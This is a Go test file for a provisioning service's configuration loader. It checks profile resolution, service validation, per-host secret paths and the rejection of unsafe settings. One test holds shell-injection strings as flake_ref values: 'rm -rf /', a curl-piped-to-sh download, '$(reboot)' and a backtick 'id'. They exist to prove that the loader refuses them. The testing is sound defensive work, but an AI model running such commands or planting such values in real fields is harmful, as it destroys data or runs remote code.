package config_test

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/aviralmansingka/dotfiles/ops/provision/internal/config"
	"github.com/aviralmansingka/dotfiles/ops/provision/internal/domain"
)

// Shipped files the configuration tests read.
const (
	shippedProfiles       = "../../config/profiles.yaml"
	shippedServiceExample = "../../config/service.example.yaml"
)

// TestShippedProfilesLoadAndResolve is the D1 regression test at the level that
// matters: the configuration file in the tree must load, and every approved
// profile must resolve a realistic request end to end.
func TestShippedProfilesLoadAndResolve(t *testing.T) {
	t.Parallel()
	catalog, err := config.LoadProfiles(shippedProfiles)
	if err != nil {
		t.Fatalf("LoadProfiles(%s): %v", shippedProfiles, err)
	}
	profiles := catalog.Profiles()
	if len(profiles) == 0 {
		t.Fatal("the shipped profile file has no profiles")
	}
	for _, profile := range profiles {
		profile := profile
		t.Run(profile.Name, func(t *testing.T) {
			if len(profile.Regions) == 0 || len(profile.Sizes) == 0 {
				t.Fatalf("profile %q has no regions or sizes", profile.Name)
			}
			for sizeName := range profile.Sizes {
				spec, err := catalog.Resolve(domain.CreateHostRequest{
					Provider: string(domain.ProviderAWS),
					Name:     "canary-01",
					Profile:  profile.Name,
					Region:   profile.Regions[0],
					Size:     sizeName,
				})
				if err != nil {
					t.Fatalf("profile %q size %q does not resolve: %v", profile.Name, sizeName, err)
				}
				if spec.FlakeRef != profile.FlakeRef {
					t.Fatalf("resolved flake_ref = %q, want the approved %q", spec.FlakeRef, profile.FlakeRef)
				}
				if spec.InstanceType == "" || spec.DiskGB <= 0 {
					t.Fatalf("profile %q size %q did not map to a concrete shape: %+v", profile.Name, sizeName, spec)
				}
				if spec.Provider != domain.ProviderAWS {
					t.Fatalf("resolved provider = %q", spec.Provider)
				}
			}
		})
	}
}

// TestShippedServiceExampleLoads keeps the documented service configuration
// honest: it must pass the same validation the API applies at startup.
func TestShippedServiceExampleLoads(t *testing.T) {
	t.Parallel()
	service, err := config.LoadService("../../config/service.example.yaml")
	if err != nil {
		t.Fatalf("LoadService: %v", err)
	}
	if !service.API.TLS.Enabled() && service.API.Listen != "127.0.0.1:8080" {
		t.Fatalf("example listen = %q, want the documented loopback address", service.API.Listen)
	}
	if service.Providers["aws"].Credentials.Kind != "openbao_approle" {
		t.Fatalf("example credential kind = %q", service.Providers["aws"].Credentials.Kind)
	}
}

// TestProfilesFileRejectsHostileFlakeRef proves the shipped-file path keeps the
// injection guarantee: a profile document with a shell-shaped flake_ref is
// refused at load time, before any request is served.
func TestProfilesFileRejectsHostileFlakeRef(t *testing.T) {
	t.Parallel()
	hostile := []string{
		".#host; rm -rf /",
		".#host && curl http://example.com | sh",
		".#host `id`",
		"$(reboot)",
		".#host\npath:./evil#host",
	}
	for _, ref := range hostile {
		ref := ref
		t.Run(ref, func(t *testing.T) {
			t.Parallel()
			path := filepath.Join(t.TempDir(), "profiles.yaml")
			document := `profiles:
  - name: rex
    display_name: Managed Rex host
    provider: aws
    regions:
      - ap-south-1
    sizes:
      standard:
        instance_type: t3.medium
        disk_gb: 40
    tags:
      owner: homelab
    secret_bundles:
      canary: bao:secret/data/hosts/{host}/canary
    flake_ref: "` + ref + `"
`
			if err := os.WriteFile(path, []byte(document), 0o600); err != nil {
				t.Fatalf("write profiles: %v", err)
			}
			if _, err := config.LoadProfiles(path); err == nil {
				t.Fatalf("LoadProfiles accepted flake_ref %q", ref)
			}
		})
	}
}

// TestProfilesFileRejectsUnknownKeys keeps a secret value or an arbitrary field
// from hiding in the profile document.
func TestProfilesFileRejectsUnknownKeys(t *testing.T) {
	t.Parallel()
	path := filepath.Join(t.TempDir(), "profiles.yaml")
	document := `profiles:
  - name: rex
    provider: aws
    regions:
      - ap-south-1
    sizes:
      standard:
        instance_type: t3.medium
        disk_gb: 40
    flake_ref: ".#host"
    executable: /bin/sh
`
	if err := os.WriteFile(path, []byte(document), 0o600); err != nil {
		t.Fatalf("write profiles: %v", err)
	}
	if _, err := config.LoadProfiles(path); err == nil {
		t.Fatal("LoadProfiles accepted an unknown profile field")
	}
}

// TestServiceRejectsUnapprovedProviderPolicy keeps the S02 boundary at the load
// stage: the shipped example is the baseline, and every single-value change
// below has to be refused before a worker starts.
func TestServiceRejectsUnapprovedProviderPolicy(t *testing.T) {
	t.Parallel()
	service, err := config.LoadService("../../config/service.example.yaml")
	if err != nil {
		t.Fatalf("LoadService: %v", err)
	}
	if err := service.Validate(); err != nil {
		t.Fatalf("the shipped example does not validate: %v", err)
	}

	mutate := func(fn func(aws *config.Provider)) *config.Service {
		copied := *service
		copied.Providers = map[string]config.Provider{"aws": service.Providers["aws"]}
		aws := copied.Providers["aws"]
		fn(&aws)
		copied.Providers["aws"] = aws
		return &copied
	}

	cases := map[string]func(aws *config.Provider){
		"unapproved region": func(aws *config.Provider) { aws.Region = "us-east-1" },
		"open bootstrap cidr": func(aws *config.Provider) {
			aws.Bootstrap.SSHSourceCIDR = "0.0.0.0/0"
		},
		"wide bootstrap cidr": func(aws *config.Provider) {
			aws.Bootstrap.SSHSourceCIDR = "10.0.0.0/1"
		},
		"missing ssh key file": func(aws *config.Provider) { aws.Bootstrap.SSHPublicKeyFile = "" },
		"private key path": func(aws *config.Provider) {
			aws.Bootstrap.SSHPublicKeyFile = "/etc/fleet-provision/ssh/host-bootstrap"
		},
		"shared run directory": func(aws *config.Provider) {
			aws.Terraform.RunDir = aws.Terraform.Dir
		},
		"missing state bucket":   func(aws *config.Provider) { aws.Terraform.StateBucket = "" },
		"tag value with a space": func(aws *config.Provider) { aws.Terraform.OwnerTag = "two words" },
		"missing vpc id":         func(aws *config.Provider) { aws.Terraform.VPCID = "" },
		"malformed vpc id":       func(aws *config.Provider) { aws.Terraform.VPCID = "default" },
		"missing subnet id":      func(aws *config.Provider) { aws.Terraform.SubnetID = "" },
		"malformed subnet id":    func(aws *config.Provider) { aws.Terraform.SubnetID = "subnet-xyz" },
	}
	for name, change := range cases {
		change := change
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			if err := mutate(change).Validate(); err == nil {
				t.Fatalf("Validate accepted %s", name)
			}
		})
	}
}

// TestEnrollmentHasNoKeySetting pins the owner decision of 2026-11-09: every
// enrollment parameter is encrypted with the AWS-managed `alias/aws/ssm` key, so
// no service setting names a key and no operator creates one. The struct check is
// the structural half (a field cannot come back unnoticed); the file check keeps
// the documented example honest.
func TestEnrollmentHasNoKeySetting(t *testing.T) {
	t.Parallel()
	ssmType := reflect.TypeOf(config.SSMEnrollment{})
	for i := 0; i < ssmType.NumField(); i++ {
		field := ssmType.Field(i)
		if strings.Contains(strings.ToLower(field.Name), "kms") {
			t.Fatalf("enrollment.ssm still has the key setting %q; the key is AWS-managed and not configuration", field.Name)
		}
	}
	raw, err := os.ReadFile(shippedServiceExample)
	if err != nil {
		t.Fatalf("read %s: %v", shippedServiceExample, err)
	}
	for _, line := range strings.Split(string(raw), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "kms_") && strings.Contains(trimmed, ":") {
			t.Fatalf("the shipped example still names an enrollment key: %q", trimmed)
		}
	}
}

// TestShippedProfilesMapAPerHostBundlePath is the configuration half of the
// per-host identity: the shipped profile names one bundle mapping whose template
// renders a different KV path for every host, so two hosts can never share a
// secret path and a literal shared path is refused at load time.
func TestShippedProfilesMapAPerHostBundlePath(t *testing.T) {
	t.Parallel()
	catalog, err := config.LoadProfiles(shippedProfiles)
	if err != nil {
		t.Fatalf("LoadProfiles(%s): %v", shippedProfiles, err)
	}
	for _, profile := range catalog.Profiles() {
		if len(profile.SecretBundles) == 0 {
			t.Fatalf("profile %q declares no secret bundles", profile.Name)
		}
		first, err := profile.SecretBundles.Render("host-0001")
		if err != nil {
			t.Fatalf("profile %q render(host-0001): %v", profile.Name, err)
		}
		second, err := profile.SecretBundles.Render("host-0002")
		if err != nil {
			t.Fatalf("profile %q render(host-0002): %v", profile.Name, err)
		}
		if len(first) != len(second) || len(first) == 0 {
			t.Fatalf("profile %q rendered %d and %d bundles", profile.Name, len(first), len(second))
		}
		for i := range first {
			if first[i] == second[i] {
				t.Fatalf("profile %q rendered one path %q for two hosts", profile.Name, first[i])
			}
			if !strings.Contains(first[i], "host-0001") {
				t.Fatalf("profile %q rendered %q, which is not scoped to the host identity", profile.Name, first[i])
			}
			if strings.Contains(first[i], "{host}") {
				t.Fatalf("profile %q left the placeholder unrendered in %q", profile.Name, first[i])
			}
		}
	}
}

// TestProfilesFileRejectsASharedBundlePath keeps a literal, host-independent path
// from loading: the per-host placeholder is what stops two hosts sharing one
// secret tree.
func TestProfilesFileRejectsASharedBundlePath(t *testing.T) {
	t.Parallel()
	shared := []string{
		"bao:secret/data/hosts/rex/canary",
		"bao:secret/data/fleet/tailscale-oauth",
		"bao:secret/data/hosts/{host}/../rex/canary",
	}
	for _, bundle := range shared {
		path := filepath.Join(t.TempDir(), "profiles.yaml")
		document := `profiles:
  - name: rex
    provider: aws
    regions:
      - ap-south-1
    sizes:
      standard:
        instance_type: t3.medium
        disk_gb: 40
    tags:
      owner: homelab
    secret_bundles:
      canary: "` + bundle + `"
    flake_ref: .#homeConfigurations.remote-mumbai.activationPackage
`
		if err := os.WriteFile(path, []byte(document), 0o600); err != nil {
			t.Fatalf("write profiles: %v", err)
		}
		if _, err := config.LoadProfiles(path); err == nil {
			t.Fatalf("LoadProfiles accepted the shared bundle path %q", bundle)
		}
	}
}
